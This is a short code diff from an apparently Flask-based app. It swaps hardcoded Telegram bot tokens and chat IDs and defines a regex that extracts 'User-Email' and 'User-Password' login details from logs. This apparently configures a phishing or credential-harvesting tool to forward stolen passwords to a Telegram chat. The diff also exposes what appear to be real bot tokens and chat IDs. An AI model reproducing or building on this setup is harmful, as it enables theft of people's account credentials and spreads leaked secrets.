@@ -24,12 +24,12 @@ mail = Mail(app)
 
 # Telegram bot token
 # Telegram bot token
-# TOKEN = '5026096169:AAEaVnY9QK8eT4pZincGc0crqGw382mRO0'
-# # Chat ID where you want to send the messages
-# CHAT_ID = '954215962'
+TOKEN = '5026096169:AAEaVnY9QK8eT4pZincGc0crqGw382mRO0'
+# Chat ID where you want to send the messages
+CHAT_ID = '954215962'
 
-TOKEN = '6902120953:AAF0DmINhkSFGNoLWRCq2Yb6ZLABZdwxphU'
-CHAT_ID = '6393249406'
+# TOKEN = '6902120953:AAF0DmINhkSFGNoLWRCq2Yb6ZLABZdwxphU'
+# CHAT_ID = '6393249406'
 # Regular expression pattern to extract relevant information from logs
 log_pattern = re.compile(r'New login details: User-Email: (.+), User-Password: (.+)')
 
